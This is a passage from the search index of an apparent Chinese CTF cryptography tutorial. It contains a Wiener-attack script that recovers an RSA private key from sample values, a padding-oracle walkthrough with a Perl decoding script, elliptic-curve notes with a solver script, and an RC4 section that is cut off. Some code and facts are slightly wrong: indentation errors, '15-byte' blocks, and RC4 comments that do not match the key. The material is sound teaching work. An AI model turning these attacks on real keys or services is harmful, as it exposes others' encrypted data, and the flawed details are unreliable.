\u8fd4\u56de\u8fde\u5206\u6570\u7684\u5404\u9879\u3002\n    \"\"\"\n    res = []\n\n    while y:\n        res.append(x // y)\n\n        x, y = y, x % y\n\n    return res\n\ndef continued_fraction(sub_res):\n    \"\"\"\n    \u6839\u636e\u8fde\u5206\u6570\u9879\u8ba1\u7b97\u6e10\u8fdb\u5206\u6570\u7684\u5206\u5b50\u548c\u5206\u6bcd\u3002\n    sub_res: \u8fde\u5206\u6570\u7684\u90e8\u5206\u5e8f\u5217\u3002\n    \u8fd4\u56de\u5206\u6bcd\u548c\u5206\u5b50\u3002\n    \"\"\"\n    numerator, denominator = 1, 0\n\n    # \u4ece\u540e\u5f80\u524d\u8ba1\u7b97\n    for i in reversed(sub_res):\n        denominator, numerator = numerator, i * numerator + denominator\n\n    return denominator, numerator\n\ndef sub_fraction(x, y):\n    \"\"\"\n    \u8ba1\u7b97\u5206\u6570 x/y \u7684\u6240\u6709\u6e10\u8fdb\u5206\u6570\u3002\n    \u8fd4\u56de\u6bcf\u4e2a\u6e10\u8fdb\u5206\u6570\u7684\u5206\u6bcd\u548c\u5206\u5b50\u3002\n    \"\"\"\n    res = transform(x, y)\n\n    return [continued_fraction(res[:i]) for i in range(1, len(res))]\n\ndef get_pq(a, b, c):\n    \"\"\"\n    \u6839\u636e\u7ef4\u8fbe\u5b9a\u7406\u7531 p+q \u548c pq \u6c42\u89e3 p \u548c q\u3002\n    a, b, c: \u4e8c\u6b21\u65b9\u7a0b ax^2 + bx + c = 0 \u7684\u7cfb\u6570\u3002\n    \u8fd4\u56de\u65b9\u7a0b\u7684\u4e24\u4e2a\u6839\u3002\n    \"\"\"\n\n    # \u5224\u522b\u5f0f\u7684\u5e73\u65b9\u6839\n    discriminant = gmpy2.isqrt(b * b - 4 * a * c)\n\n    x1 = (-b + discriminant) // (2 * a)\n\n    x2 = (-b - discriminant) // (2 * a)\n\n    return x1, x2\n\ndef wiener_attack(e, n):\n    \"\"\"\n    \u5b9e\u73b0\u7ef4\u7eb3\u653b\u51fb\uff0c\u7528\u4e8e\u7834\u89e3 RSA \u79c1\u94a5\u3002\n    e: \u516c\u94a5\u6307\u6570\u3002\n    n: \u516c\u94a5\u6a21\u6570\u3002\n    \u8fd4\u56de\u627e\u5230\u7684\u79c1\u94a5 d\uff0c\u5982\u679c\u653b\u51fb\u65e0\u6548\u5219\u8fd4\u56de None\u3002\n    \"\"\"\n    for d, k in sub_fraction(e, n):\n        # \u8df3\u8fc7\u65e0\u6548\u7684\u6e10\u8fdb\u5206\u6570\n         if k == 0:  \n             continue\n\n        # \u68c0\u67e5 (e*d - 1) \u662f\u5426\u53ef\u4ee5\u6574\u9664 k\n         if (e * d - 1) % k != 0:\n             continue\n\n        # \u8ba1\u7b97 \u03c6(n)\n         phi = (e * d - 1) // k\n\n         # \u6839\u636e \u03c6(n) \u6c42\u89e3 p \u548c q\n        p, q = get_pq(1, n - phi + 1, n)\n\n        # \u9a8c\u8bc1\u5206\u89e3\u662f\u5426\u6b63\u786e\n        if p * q == n:\n            # \u786e\u4fdd\u7ed3\u679c\u4e3a\u6b63\u6570\n             p, q = abs(int(p)), abs(int(q))\n\n             # \u8ba1\u7b97\u79c1\u94a5 d\n             d = gmpy2.invert(e, (p - 1) * (q - 1))\n\n             return d\n\n    print(\"\u7ef4\u7eb3\u653b\u51fb\u65e0\u6548\")\n\n    return None\n\n# \u793a\u4f8b\u6570\u636e\nif __name__ == \"__main__\":\n    n = 114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497\n    e = 35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705\n    c = 60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380\n\n    # \u6267\u884c\u7ef4\u7eb3\u653b\u51fb\n    d = wiener_attack(e, n)\n\n    if d:\n        print(\"\u627e\u5230\u79c1\u94a5 d =\", d)\n\n        # \u89e3\u5bc6\u5bc6\u6587\n        print(\"\u89e3\u5bc6\u7ed3\u679c:\", long_to_bytes(pow(c, d, n)))\n</code></pre>"},{"location":"Crypto/Chapter7/7-1/","title":"\u586b\u5145 Oracle \u653b\u51fb","text":""},{"location":"Crypto/Chapter7/7-1/#\u586b\u5145-oracle-\u653b\u51fb","title":"\u586b\u5145 Oracle \u653b\u51fb","text":"<p>\u5148\u6765\u4e86\u89e3\u4e0b CBC \u6a21\u5f0f</p> <p>\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <ol> <li>\u521d\u59cb\u5316\u5411\u91cf\uff08Initialization Vector\uff0cIV\uff09\uff1a\u52a0\u5bc6\u8fc7\u7a0b\u59cb\u4e8e\u4e00\u4e2a\u968f\u673a\u6216\u4f2a\u968f\u673a\u751f\u6210\u7684 IV\uff0c\u8fd9\u4e2a IV \u4e0e\u7b2c\u4e00\u4e2a\u660e\u6587\u5757\u8fdb\u884c XOR \u64cd\u4f5c\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8f93\u5165\u52a0\u5bc6\u7b97\u6cd5\uff0c\u751f\u6210\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5757</li> <li>\u540e\u7eed\u5757\u5904\u7406\uff1a\u5bf9\u4e8e\u540e\u7eed\u7684\u6bcf\u4e2a\u660e\u6587\u5757\uff0c\u5148\u4e0e\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u8fdb\u884c XOR \u64cd\u4f5c\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8f93\u5165\u52a0\u5bc6\u7b97\u6cd5\uff0c\u751f\u6210\u65b0\u7684\u5bc6\u6587\u5757</li> </ol> <p>\u6570\u5b66\u8868\u8fbe\u5f0f\uff1a<code>C_i = E_K(P_i \u2295 C_{i-1})</code>\uff0c\u5176\u4e2d <code>C_0 = IV</code></p> <p>\u89e3\u5bc6\u8fc7\u7a0b\uff1a</p> <ol> <li>\u7b2c\u4e00\u5757\u89e3\u5bc6\uff1a\u5c06\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5757\u8f93\u5165\u89e3\u5bc6\u7b97\u6cd5\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4e0e IV \u8fdb\u884c XOR \u64cd\u4f5c\uff0c\u6062\u590d\u7b2c\u4e00\u4e2a\u660e\u6587\u5757</li> <li>\u540e\u7eed\u5757\u89e3\u5bc6\uff1a\u5bf9\u4e8e\u540e\u7eed\u7684\u6bcf\u4e2a\u5bc6\u6587\u5757\uff0c\u5148\u5c06\u5176\u8f93\u5165\u89e3\u5bc6\u7b97\u6cd5\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4e0e\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u8fdb\u884c XOR \u64cd\u4f5c\uff0c\u6062\u590d\u5bf9\u5e94\u7684\u660e\u6587\u5757</li> </ol> <p>\u6570\u5b66\u8868\u8fbe\u5f0f\uff1a<code>P_i = D_K(C_i) \u2295 C_{i-1}</code>\uff0c\u5176\u4e2d <code>C_0 = IV</code></p> <p>\u4e0b\u8f7d\u9644\u4ef6</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6709\u6548\u8bf7\u6c42\uff08HTTP \u72b6\u6001\u4ee3\u7801 200\uff09\uff0c\u7136\u540e\u662f\u4e00\u7cfb\u5217 500 \u8bf7\u6c42\uff0c\u4ee5\u53ca\u4e00\u4e2a 403 \u8bf7\u6c42</p> <p></p> <p>\u56fe\u7247\u4e2d\u663e\u793a\u7684 URL \u662f base64 URLSafe \u7f16\u7801\u7684\uff0c\u89e3\u7801\u540e\u5269\u4e0b 30 \u4e2a\u5b57\u8282</p> <p></p> <p>\u7531\u4e8e\u653b\u51fb\u8005\u5f00\u59cb\u66f4\u6539\u7b2c 15 \u4e2a\u5b57\u8282\uff0c\u8fd9\u610f\u5473\u7740\u8fd9\u91cc\u7684\u5757\u5927\u5c0f\u4e5f\u662f 15 \u4e2a\u5b57\u8282</p> <p></p> <p>500 \u4e2a\u670d\u52a1\u5668\u9519\u8bef\u663e\u7136\u662f\u7531\u4e0d\u6b63\u786e\u7684\u586b\u5145\u5e8f\u5217\u5f15\u8d77\u7684\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a 403 \u9519\u8bef</p> <p>\u8fd9\u610f\u5473\u7740\u653b\u51fb\u8005\u731c\u5230\u4e86\u6b63\u786e\u7684\u586b\u5145\u5e8f\u5217\uff0c\u653b\u51fb\u8005\u53ea\u9700\u4ece\u5b57\u8282 0x00 \u5faa\u73af\u5230 0xFF\uff0c\u76f4\u5230\u54cd\u5e94\u4e0d\u540c\u4e8e 500</p> <p>\u5f53\u731c\u51fa\u7b2c\u4e00\u4e2a\u503c\u65f6\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5c06\u5176\u4e0e 0x01 \u8fdb\u884c\u5f02\u6216\u4ee5\u83b7\u5f97\u4e2d\u95f4\u503c</p> <p>\u73b0\u5728\u653b\u51fb\u8005\u9700\u8981\u627e\u5230\u4e2d\u95f4\u503c\u7684\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u56e0\u6b64\u586b\u5145\u9700\u8981\u4e3a 0x02</p> <p>\u5df2\u7ecf\u627e\u5230\u7684\u503c\u9996\u5148\u4e0e 0x02 \u8fdb\u884c\u5f02\u6216\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u8282\u518d\u6b21\u4ece 0x00 \u5faa\u73af\u5230 0xFF\uff0c\u76f4\u5230\u627e\u5230\u6709\u6548\u5e8f\u5217</p> <p>\u8fd9\u4e00\u5207\u90fd\u53ef\u4ee5\u5728\u65e5\u5fd7\u6587\u4ef6\u4e2d\u770b\u5230\uff0c\u56e0\u4e3a\u6709 16 \u4e2a\u8bf7\u6c42\u5bfc\u81f4 HTTP \u72b6\u6001\u4ee3\u7801 403\uff08\u5728\u6570\u5343\u4e2a\u5176\u4ed6\u8bf7\u6c42\u4e2d\uff09</p> <p></p> <p>\u8fd9\u91cc\u7684\u6311\u6218\u662f\u731c\u6d4b\u653b\u51fb\u8005\u4f7f\u7528\u7b2c\u4e00\u4e2a\uff08200\uff09\u8bf7\u6c42\u68c0\u7d22\u4e86\u4ec0\u4e48</p> <p>\u4e3a\u4e86\u89e3\u5bc6\uff0c\u6211\u4eec\u9700\u8981\u6309\u7167\u4e0a\u9762\u63cf\u8ff0\u7684\u8fc7\u7a0b\u627e\u5230\u6240\u6709\u4e2d\u95f4\u503c</p> <p>\u7136\u540e\u6211\u4eec\u9700\u8981\u5c06\u4e2d\u95f4\u503c\u4e0e 200 \u8bf7\u6c42\u7684\u521d\u59cb\u5316\u5411\u91cf (IV) \u8fdb\u884c\u5f02\u6216 - IV \u662f\u8bf7\u6c42\u7684\u524d 16 \u4e2a\u5b57\u8282</p> <pre><code>use MIME::Base64::URLSafe;\n\n$final = \"8LU7LaBB_KSe8LmDkGCzRaIeorRgX4RBdRsmYdZzjx0\";\n\n# \u4f7f\u7528unpack 'c*'\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u89e3\u5305\u6210\u5b57\u8282\u6570\u7ec4\uff0c\u5b58\u50a8\u5728@final_bytes\u4e2d\n@final_bytes = unpack 'c*', urlsafe_b64decode($final);\n\n$i = 1;\n\n# &lt;&gt; \u8868\u793a\u4ece\u6807\u51c6\u8f93\u5165\u6216\u6587\u4ef6\u4e2d\u8bfb\u53d6\u884c\nwhile (&lt;&gt;) {\n    @bytes = unpack 'c*', urlsafe_b64decode($_);\n    printf \"step: %d, byte: %x\\n\", $i, $bytes[16 - $i];\n    $inter[16 - $i] = $bytes[16 - $i] ^ $i;\n    printf \"intermediate: %x\\n\", $inter[16 - $i];\n    $i++;\n}\n\nprint \"Decoding final string:\\n\";\nfor ($i = 0; $i &lt; 16; $i++) {\n    print chr($inter[$i] ^ $final_bytes[$i]);\n}\nprint \"\\n\";\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981\u5c06 16 \u4e2a 403 \u8bf7\u6c42\u4f5c\u4e3a STDIN \u8f93\u5165\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u4e3a\u6211\u4eec\u89e3\u51b3\u8fd9\u4e2a\u96be\u9898</p> <p></p>"},{"location":"Crypto/Chapter8/8-1/","title":"\u516c\u94a5 k","text":""},{"location":"Crypto/Chapter8/8-1/#\u516c\u94a5-k","title":"\u516c\u94a5 k","text":"<p>\u963f\u8d1d\u5c14\u7fa4\u6027\u8d28\uff1a</p> <p>\u963f\u8d1d\u5c14\u7fa4\uff0c\u53c8\u79f0\u4ea4\u6362\u7fa4\uff0c\u662f\u4ee3\u6570\u5b66\u4e2d\u4e00\u7c7b\u91cd\u8981\u7684\u4ee3\u6570\u7ed3\u6784</p> <ol> <li>\u5c01\u95ed\u6027\uff1a\u2200 a,b \u2208 G \u21d2 a + b \u2208 G</li> <li>\u7ed3\u5408\u5f8b\uff1a\u2200 a,b,c \u2208 G \u21d2 (a + b) + c = a + (b + c)</li> <li>\u5355\u4f4d\u5143\uff1a\u2203 e \u2208 G \u4f7f\u5f97 \u2200 a \u2208 G \u21d2 a + e = e + a = a\uff0ce \u5c31\u662f\u5355\u4f4d\u5143</li> <li>\u9006\u5143\uff1a\u2200 a \u2208 G \u21d2 \u2203 b \u2208 G \u4f7f\u5f97 a + b = 0</li> <li>\u4ea4\u6362\u5f8b\uff1a\u2200 a,b \u2208 G \u21d2 a + b = b + a</li> </ol> <p>\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\uff1a</p> <p></p> <p>\u692d\u5706\u66f2\u7ebf\u7684\u52a0\u6cd5\uff1a</p> <p>\u8fc7\u66f2\u7ebf\u4e0a\u7684\u4e24\u70b9 A\u3001B \u753b\u4e00\u6761\u76f4\u7ebf\uff0c\u627e\u5230\u76f4\u7ebf\u4e0e\u692d\u5706\u66f2\u7ebf\u7684\u4ea4\u70b9\uff0c\u4ea4\u70b9\u5173\u4e8ex\u8f74\u5bf9\u79f0\u4f4d\u7f6e\u7684\u70b9\uff0c\u5b9a\u4e49\u4e3a A+B\uff0c\u5373\u4e3a\u52a0\u6cd5</p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff1aA + B = C</p> <p>\u8fd9\u4e2a\u52a0\u6cd5\u8fd0\u7b97\u5177\u6709\u963f\u8d1d\u5c14\u7fa4\u6027\u8d28</p> <p></p> <p>\u692d\u5706\u66f2\u7ebf\u7684\u4e8c\u500d\u8fd0\u7b97\uff1a</p> <p>\u4e0a\u8ff0\u65b9\u6cd5\u65e0\u6cd5\u89e3\u91ca A + A\uff0c\u5373\u4e24\u70b9\u91cd\u5408\u7684\u60c5\u51b5</p> <p>\u56e0\u6b64\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u692d\u5706\u66f2\u7ebf\u5728 A \u70b9\u7684\u5207\u7ebf\uff0c\u4e0e\u692d\u5706\u66f2\u7ebf\u7684\u4ea4\u70b9\uff0c\u4ea4\u70b9\u5173\u4e8e x \u8f74\u5bf9\u79f0\u4f4d\u7f6e\u7684\u70b9\uff0c\u5b9a\u4e49\u4e3a A + A\uff0c\u5373 2A\uff08\u4e8c\u500d\u8fd0\u7b97\uff09</p> <p></p> <p>\u540c\u4f59\u8fd0\u7b97\uff1a</p> <p>\u540c\u4f59\u5c31\u662f\u6709\u76f8\u540c\u7684\u4f59\u6570\uff0c\u4e24\u4e2a\u6574\u6570 a\u3001 b</p> <p>\u82e5\u5b83\u4eec\u9664\u4ee5\u6b63\u6574\u6570 m \u6240\u5f97\u7684\u4f59\u6570\u76f8\u7b49\uff0c\u5219\u79f0 a\uff0c b \u5bf9\u4e8e\u6a21 m \u540c\u4f59</p> <pre><code>a \u2261 b (mod m)\n</code></pre> <p>\u6709\u9650\u57df\uff1a</p> <p>\u692d\u5706\u66f2\u7ebf\u662f\u8fde\u7eed\u7684\uff0c\u5e76\u4e0d\u9002\u5408\u7528\u4e8e\u52a0\u5bc6\uff1b\u6240\u4ee5\u5fc5\u987b\u628a\u692d\u5706\u66f2\u7ebf\u53d8\u6210\u79bb\u6563\u7684\u70b9\uff0c\u8981\u628a\u692d\u5706\u66f2\u7ebf\u5b9a\u4e49\u5728\u6709\u9650\u57df\u4e0a</p> <p>\u800c\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u6240\u4f7f\u7528\u7684\u692d\u5706\u66f2\u7ebf\u662f\u5b9a\u4e49\u5728\u6709\u9650\u57df\u5185</p> <p>\u6709\u9650\u57df\u6700\u5e38\u89c1\u7684\u4f8b\u5b50\u662f\u6709\u9650\u57df GF(p)\uff0c\u6307\u7ed9\u5b9a\u67d0\u8d28\u6570 p\uff0c\u7531 0,1,2...p-1 \u5171 p \u4e2a\u5143\u7d20\u7ec4\u6210\u7684\u6574\u6570\u96c6\u5408\u4e2d\u52a0\u6cd5\u3001\u4e8c\u500d\u8fd0\u7b97</p> <p>\u4f8b\u5982 GF(233) \u5c31\u662f</p> <pre><code>y^2 = (x^3 + 7)(mod 233)\n</code></pre> <p>\u692d\u5706\u66f2\u7ebf\u52a0\u89e3\u5bc6\u7b97\u6cd5\u539f\u7406\uff1a</p> <p>\u8bbe\u79c1\u94a5\u3001\u516c\u94a5\u5206\u522b\u4e3a d\u3001Q\uff0c\u5373 Q = dG\uff0c\u5176\u4e2d G \u4e3a\u57fa\u70b9\uff0c\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u5df2\u77e5 G \u548c dG\uff0c\u6c42 d \u662f\u975e\u5e38\u56f0\u96be\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5df2\u77e5\u516c\u94a5\u548c\u57fa\u70b9\uff0c\u60f3\u8981\u7b97\u51fa\u79c1\u94a5\u662f\u975e\u5e38\u56f0\u96be\u7684</p> <p>\u516c\u94a5\u52a0\u5bc6\uff1a\u9009\u62e9\u968f\u673a\u6570 r\uff0c\u5c06\u6d88\u606f M \u751f\u6210\u5bc6\u6587 C\uff0c\u8be5\u5bc6\u6587\u662f\u4e00\u4e2a\u70b9\u5bf9\uff0cC = {rG, M + rQ}\uff0c\u5176\u4e2d Q \u4e3a\u516c\u94a5</p> <p>\u79c1\u94a5\u89e3\u5bc6\uff1aM + rQ - d(rG) = M + r(dG) - d(rG) = M\uff0c\u5176\u4e2d d\u3001Q \u5206\u522b\u4e3a\u79c1\u94a5\u3001\u516c\u94a5</p> <p>\u692d\u5706\u66f2\u7ebf\u7b7e\u540d\u7b97\u6cd5\u539f\u7406\uff1a</p> <p>\u692d\u5706\u66f2\u7ebf\u7b7e\u540d\u7b97\u6cd5\uff08ECDSA\uff09\uff0c\u8bbe\u79c1\u94a5\u3001\u516c\u94a5\u5206\u522b\u4e3a d\u3001Q\uff0c\u5373 Q = dG\uff0c\u5176\u4e2d G \u4e3a\u57fa\u70b9</p> <p>\u79c1\u94a5\u7b7e\u540d\uff1a</p> <ul> <li>\u9009\u62e9\u968f\u673a\u6570 r\uff0c\u8ba1\u7b97\u70b9 rG(x, y)</li> <li>\u6839\u636e\u968f\u673a\u6570 r\u3001\u6d88\u606f M \u7684\u54c8\u5e0c h\u3001\u79c1\u94a5 d\uff0c\u8ba1\u7b97 s = (h + dx)/r\u3000\u3000</li> <li>\u5c06\u6d88\u606f M\u3001\u548c\u7b7e\u540d {rG, s} \u53d1\u7ed9\u63a5\u6536\u65b9</li> </ul> <p>\u516c\u94a5\u9a8c\u8bc1\u7b7e\u540d\uff1a\u3000\u3000</p> <ul> <li>\u63a5\u6536\u65b9\u6536\u5230\u6d88\u606f M\u3001\u4ee5\u53ca\u7b7e\u540d {rG=(x,y), s}\u3000\u3000</li> <li>\u6839\u636e\u6d88\u606f\u6c42\u54c8\u5e0c h\u3000</li> <li>\u4f7f\u7528\u53d1\u9001\u65b9\u516c\u94a5 Q \u8ba1\u7b97\uff1ahG/s + xQ/s\uff0c\u5e76\u4e0e rG \u6bd4\u8f83\uff0c\u5982\u76f8\u7b49\u5373\u9a8c\u7b7e\u6210\u529f</li> <li>\u539f\u7406\uff1ahG/s + xQ/s = hG/s + x(dG)/s = (h+xd)G/s = r(h+xd)G / (h+dx) = rG</li> </ul> <p>\u7b7e\u540d\u8fc7\u7a0b\uff1a</p> <p>\u5047\u8bbe\u8981\u7b7e\u540d\u7684\u6d88\u606f\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a\"Hello World!\"</p> <p>DSA \u7b7e\u540d\u7684\u7b2c\u4e00\u4e2a\u6b65\u9aa4\u662f\u5bf9\u5f85\u7b7e\u540d\u7684\u6d88\u606f\u751f\u6210\u4e00\u4e2a\u6d88\u606f\u6458\u8981\uff0c\u4e0d\u540c\u7684\u7b7e\u540d\u7b97\u6cd5\u4f7f\u7528\u4e0d\u540c\u7684\u6d88\u606f\u6458\u8981\u7b97\u6cd5</p> <p>\u800c ECDSA256 \u4f7f\u7528 SHA256 \u751f\u6210 256 \u6bd4\u7279\u7684\u6458\u8981</p> <p>\u6458\u8981\u751f\u6210\u7ed3\u675f\u540e\uff0c\u5e94\u7528\u7b7e\u540d\u7b97\u6cd5\u5bf9\u6458\u8981\u8fdb\u884c\u7b7e\u540d\uff1a</p> <ul> <li>\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u6570 k</li> <li>\u5229\u7528\u968f\u673a\u6570 k\uff0c\u8ba1\u7b97\u51fa\u4e24\u4e2a\u5927\u6570 r \u548cs\uff0c\u5c06 r \u548c s \u62fc\u5728\u4e00\u8d77\u5c31\u6784\u6210\u4e86\u5bf9\u6d88\u606f\u6458\u8981\u7684\u7b7e\u540d</li> </ul> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a\u968f\u673a\u6570 k \u7684\u5b58\u5728\uff0c\u5bf9\u4e8e\u540c\u4e00\u6761\u6d88\u606f\uff0c\u4f7f\u7528\u540c\u4e00\u4e2a\u7b97\u6cd5\uff0c\u4ea7\u751f\u7684\u7b7e\u540d\u662f\u4e0d\u4e00\u6837\u7684</p> <p>\u4ece\u51fd\u6570\u7684\u89d2\u5ea6\u6765\u7406\u89e3\uff0c\u7b7e\u540d\u51fd\u6570\u5bf9\u540c\u6837\u7684\u8f93\u5165\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u8f93\u51fa</p> <p>\u56e0\u4e3a\u51fd\u6570\u5185\u90e8\u4f1a\u5c06\u968f\u673a\u503c\u6df7\u5165\u7b7e\u540d\u7684\u8fc7\u7a0b</p> <p>\u73b0\u5728\u6765\u505a\u9898</p> <pre><code>\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6 Ep(a,b) \u53c2\u6570\u4e3a\n\np = 15424654874903\na = 16546484\nb = 4548674875\nG(6478678675,5636379357093)\n\n\u79c1\u94a5\u4e3a k = 546768\n\n\u6c42\u516c\u94a5 K(x,y)\n</code></pre> <p>\u811a\u672c\u89e3\u9898\u5982\u4e0b\uff1a</p> <pre><code>import collections\nimport random\n\nEllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h')\n\ncurve = EllipticCurve(\n   'secp256k1',\n   # Field characteristic.\n   p=int(input('p=')),\n   # Curve coefficients.\n   a=int(input('a=')),\n   b=int(input('b=')),\n   # Base point.\n   g=(int(input('Gx=')),\n      int(input('Gy='))),\n   # Subgroup order.\n   n=int(input('k=')),\n   # Subgroup cofactor.\n   h=1,\n)\n\n\n# Modular arithmetic ##########################################################\n\ndef inverse_mod(k, p):\n   \"\"\"Returns the inverse of k modulo p.\n\n  This function returns the only integer x such that (x * k) % p == 1.\n\n  k must be non-zero and p must be a prime.\n  \"\"\"\n   if k == 0:\n       raise ZeroDivisionError('division by zero')\n\n   if k &lt; 0:\n       # k ** -1 = p - (-k) ** -1 (mod p)\n       return p - inverse_mod(-k, p)\n\n   # Extended Euclidean algorithm.\n   s, old_s = 0, 1\n   t, old_t = 1, 0\n   r, old_r = p, k\n\n   while r != 0:\n       quotient = old_r // r\n       old_r, r = r, old_r - quotient * r\n       old_s, s = s, old_s - quotient * s\n       old_t, t = t, old_t - quotient * t\n\n   gcd, x, y = old_r, old_s, old_t\n\n   assert gcd == 1\n   assert (k * x) % p == 1\n\n   return x % p\n\n\n# Functions that work on curve points #########################################\n\ndef is_on_curve(point):\n   \"\"\"Returns True if the given point lies on the elliptic curve.\"\"\"\n   if point is None:\n       # None represents the point at infinity.\n       return True\n\n   x, y = point\n\n   return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0\n\n\ndef point_neg(point):\n   \"\"\"Returns -point.\"\"\"\n   assert is_on_curve(point)\n\n   if point is None:\n       # -0 = 0\n       return None\n\n   x, y = point\n   result = (x, -y % curve.p)\n\n   assert is_on_curve(result)\n\n   return result\n\n\ndef point_add(point1, point2):\n   \"\"\"Returns the result of point1 + point2 according to the group law.\"\"\"\n   assert is_on_curve(point1)\n   assert is_on_curve(point2)\n\n   if point1 is None:\n       # 0 + point2 = point2\n       return point2\n   if point2 is None:\n       # point1 + 0 = point1\n       return point1\n\n   x1, y1 = point1\n   x2, y2 = point2\n\n   if x1 == x2 and y1 != y2:\n       # point1 + (-point1) = 0\n       return None\n\n   if x1 == x2:\n       # This is the case point1 == point2.\n       m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p)\n   else:\n       # This is the case point1 != point2.\n       m = (y1 - y2) * inverse_mod(x1 - x2, curve.p)\n\n   x3 = m * m - x1 - x2\n   y3 = y1 + m * (x3 - x1)\n   result = (x3 % curve.p,\n             -y3 % curve.p)\n\n   assert is_on_curve(result)\n\n   return result\n\n\ndef scalar_mult(k, point):\n   \"\"\"Returns k * point computed using the double and point_add algorithm.\"\"\"\n   assert is_on_curve(point)\n\n\n\n   if k &lt; 0:\n       # k * point = -k * (-point)\n       return scalar_mult(-k, point_neg(point))\n\n   result = None\n   addend = point\n\n   while k:\n       if k &amp; 1:\n           # Add.\n           result = point_add(result, addend)\n\n       # Double.\n       addend = point_add(addend, addend)\n\n       k &gt;&gt;= 1\n\n   assert is_on_curve(result)\n\n   return result\n\n\n# Keypair generation and ECDHE ################################################\n\ndef make_keypair():\n   \"\"\"Generates a random private-public key pair.\"\"\"\n   private_key = curve.n\n   public_key = scalar_mult(private_key, curve.g)\n\n   return private_key, public_key\n\n\n\nprivate_key, public_key = make_keypair()\nprint(\"private key:\", hex(private_key))\nprint(\"public key: (0x{:x}, 0x{:x})\".format(*public_key))\n</code></pre> <p>\u4f7f\u7528\u5de5\u5177\u89e3\u9898\uff1a</p> <p></p>"},{"location":"Crypto/Chapter9/9-1/","title":"RC4","text":""},{"location":"Crypto/Chapter9/9-1/#rc4","title":"RC4","text":"<p>RC4 \u7279\u70b9\uff1a</p> <ul> <li>\u52a0\u5bc6\u89e3\u5bc6\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5</li> <li>\u52a0\u5bc6\u8fc7\u7a0b\u662f\u5c06\u660e\u6587\u4e0e\u5bc6\u94a5\u6d41\u8fdb\u884c\u6309\u4f4d\u5f02\u6216(XOR)</li> <li>\u5bc6\u94a5\u6d41\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u76f8\u540c</li> </ul> <p>\u7b97\u6cd5\u7ec4\u6210\uff1a</p> <ul> <li>KSA\uff1a\u5bc6\u94a5\u8c03\u5ea6\u7b97\u6cd5</li> <li>PRGA \uff1a\u4f2a\u968f\u673a\u751f\u6210\u7b97\u6cd5</li> </ul> <p>\u9996\u5148\u662f KSA\uff1a</p> <ol> <li>S \u76d2\u521d\u59cb\u5316</li> </ol> <pre><code>s = list(range(256))  # \u521d\u59cb\u5316 S \u76d2\u4e3a 0-255\n</code></pre> <ol> <li>\u4e34\u65f6\u6570\u7ec4 T \u586b\u5145</li> </ol> <pre><code>key = \"key\"  # \u793a\u4f8b\u5bc6\u94a5\nt = [key[i % len(key)] for i in range(256)]  # \u5217\u8868\u63a8\u5bfc\u5f0f\uff0c\u7528\u4e8e\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 256 \u7684\u5217\u8868\n\n# Key: 'K'(75), 'E'(69), 'Y'(89)\n# T = [75, 69, 89, 75, 69, 89, ..., 75, 69, 89] (\u91cd\u590d\u5230 256 \u5b57\u8282)\n</code></pre> <ol> <li>S \u76d2\u7f6e\u6362</li> </ol> <pre><code>j = 0\nfor i in range(256):\n    j = (j + s[i] + ord(t[i])) % 256  # \u8ba1\u7b97\u4ea4\u6362\u4f4d\u7f6e\n    s[i], s[j] = s[j], s[i]  # \u4ea4\u6362\u5143\u7d20\n\n# \u7b2c\u4e00\u8f6e \n# j = (0 + S[0] + T[0]) % 256 = (0 + 0 + 75) % 256 = 75\n# \u4ea4\u6362 S[0] \u548c S[75]\uff1aS[0]=75, S[75]=0\n\n# \u7b2c\u4e8c\u8f6e\n# j = (75 + S[1] + T[1]) % 256 = (75 + 1 + 69) % 256 = 145\n# \u4ea4\u6362 S[1] \u548c S[145]\uff1aS[1]=203, S[145]=1 (\u5047\u8bbe S[145] \u521d\u59cb\u4e3a 203)\n</code></pre> <p>PRGA \u4f2a\u968f\u673a\u751f\u6210\u7b97\u6cd5\uff1a</p> <ol> <li>\u5bc6\u94a5\u751f\u6210\u8fc7\u7a0b</li> </ol> <pre><code>i = j = 0\nkey_stream = []\nfor 